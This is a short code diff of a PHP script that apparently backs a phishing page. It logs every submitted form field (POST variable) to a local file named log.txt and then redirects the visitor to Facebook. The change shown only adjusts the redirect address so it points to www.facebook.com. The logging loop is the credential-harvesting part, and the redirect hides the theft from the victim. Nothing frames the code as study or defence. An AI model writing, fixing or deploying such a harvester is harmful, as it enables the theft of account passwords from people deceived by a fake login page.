@@ -1,5 +1,5 @@
 <?php
-header ('Location: facebook.com');
+header ('Location: www.facebook.com');
 $handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
